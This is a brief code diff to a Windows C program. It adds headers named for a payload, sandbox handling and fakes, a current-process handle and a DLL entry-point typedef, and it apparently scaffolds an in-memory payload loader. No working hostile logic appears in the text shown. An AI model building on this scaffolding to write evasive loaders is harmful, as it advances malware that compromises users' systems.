@@ -1,9 +1,16 @@
-#include "definitions.h"
+#include "libc.h"
+#include "fake.h"
 #include "payload.h"
+#include "sandbox.h"
+#include "winapi.h"
+
+#include <time.h>
 
 // Define a random value based on compile-time constants
 #define RANDOM_VAL (__TIME__[3] * __TIME__[6])
+#define CUR_PROC (HANDLE)-1
 
+typedef void (*DllEntryPoint)(HINSTANCE, DWORD, LPVOID);
 
 int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
 
